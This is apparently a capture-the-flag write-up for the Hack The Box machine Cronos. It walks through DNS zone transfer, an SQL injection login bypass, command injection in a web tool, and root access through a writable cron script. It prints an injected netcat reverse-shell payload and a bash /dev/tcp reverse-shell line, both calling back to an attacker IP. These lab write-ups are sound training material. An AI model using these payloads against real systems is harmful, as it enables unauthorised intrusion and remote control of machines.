## Introduction
Hi, today we will hack the Cronos box from HTB. This is a medium-difficulty machine that was fun to do, with no CVEs and only manual methods. We will gain a foothold by logging into a custom web app with SQLi, which has RCE. After that, we will exploit a cron job to gain elevated privileges. Lets go!
## Discovery
We will start with nmap:

![image](https://github.com/user-attachments/assets/2c57e84d-41b1-4be9-a166-1f06ad4e9029)

Okay so we have three services open:
- ssh
- DNS
- http

Bruteforcing ssh is like banging head against the wall, since there are other ports open we are not that desperate yet, i will start with http:

![image](https://github.com/user-attachments/assets/de0cb98d-a5ef-41ab-a1d5-5615021a9eba)

We can see that it is deafult apache2 page, nothing to do here. I ran dirb and found nothing. So i will move to DNS enumeration:

![image](https://github.com/user-attachments/assets/dfa45ab8-dbd5-47d4-b610-d0a4a233cb53)

I ran nslookup to resolve cronos IPs:

![image](https://github.com/user-attachments/assets/949a764d-9df9-459a-a61d-cc139617848a)

And we obtained subdomain: ```ns1.cronos.htb```, we also got domain name: ```cronos.htb```, when there is TCP DNS its allways worth trying to perform zone transfer:

![image](https://github.com/user-attachments/assets/ad8a520c-28f3-4c97-aa84-00a4cb330a95)

Here we got another two subdomains so we have now:
```
ns1.cronos.htb
www.cronos.htb
admin.cronos.htb
```
After adding theese to /etc/hosts, i moved to see what is happening at ```www.cronos.htb```:

![image](https://github.com/user-attachments/assets/0ac63058-06f2-4eb6-a986-7b9f08cdd524)

Not much there, every link go to external web pages and we dont want to fall out of scope, i will look at other subdomains before enumerating each one of them.

![image](https://github.com/user-attachments/assets/03e761bd-e6a5-4d25-8266-8ae9d5f1a01e)
## Shell
We got custom made login page, in this case when we have custom made input window its good to test for SQLi, i tried a few payloads and: ```'or 1=1-- -``` worked:

![image](https://github.com/user-attachments/assets/15e96d90-94a5-440b-97d9-1cd4d1460c4d)

This tells us that SQL query looks something like this:
```
SELECT * from users where user = '[username]' AND password = '[password]';
```
After injection it would look something like this:
```
SELECT * from users where user = ''or 1=1-- -' AND password = '[password]';
```
Everything after ```'or 1=1-- -``` is commented leaving our query in logical statement that is always true.                                        
After logging in we have this "Net Tool v0.1", i intercepted request with burp and saw that there is command being executed so i tried to pipe it with ls for easy PoC:

![image](https://github.com/user-attachments/assets/bb5450ae-bb92-4dab-8fdc-2aae32a04484)

It worked! Here is what is happening behind the scenes:

![image](https://github.com/user-attachments/assets/3b6f48f6-45a8-47f1-a5a7-20b5ec862c91)

Now we can move to shell:
```
command=ping+-c+1&host=10.10.16.5+|+rm+/tmp/f;mkfifo+/tmp/f;cat+/tmp/f|sh+-i+2>1|nc+10.10.16.5+1234+>/tmp/f
```

![image](https://github.com/user-attachments/assets/fa081b86-e5c3-4472-9830-7502f91d0e67)

And we got foothold! user.txt is in home directory of only user on this box and its readable by www-data.

## Privilege Escalation
I ran linpeas.sh and found that there is interesting cronjob running:

![image](https://github.com/user-attachments/assets/16bc04d7-2763-45d4-adef-494e46aa3d5d)

We could also enumerate it with: ```cat /etc/crontab```

![image](https://github.com/user-attachments/assets/287ba41a-318a-4cb6-8e3c-298ea716f36e)

Now we want to know if we can write in this file since it is executed by root and would be very easy to obtain root:

![image](https://github.com/user-attachments/assets/0adb8e15-4213-4694-b040-26d11b7132ea)

Nice we got write privilege, i didnt upgrade my shell to full tty becouse i thought we would get access through ssh by reading some config files thats why vi/vim didnt work for the first time but once i upgraded shell to full tty i could use vi to modify script, here is how to upgrade shell:                                         
https://0xffsec.com/handbook/shells/full-tty/                                                     
Now we wanna try to edit file:

![image](https://github.com/user-attachments/assets/8db2d435-35e2-4d69-85c3-6bce005e2219)

I added simple shell command from https://www.revshells.com/:
```
system("bash -c 'bash -i >& /dev/tcp10.10.16.5/443 0>&1'")
```
And just like that we obtained root access on this box.

![image](https://github.com/user-attachments/assets/f7e4ada1-6f27-4191-a07d-30f464b67b3f)

## Conclusion
It was really fun machine, easy/medium level i learned how to enumerate DNS, hope you also learned something and had fun!
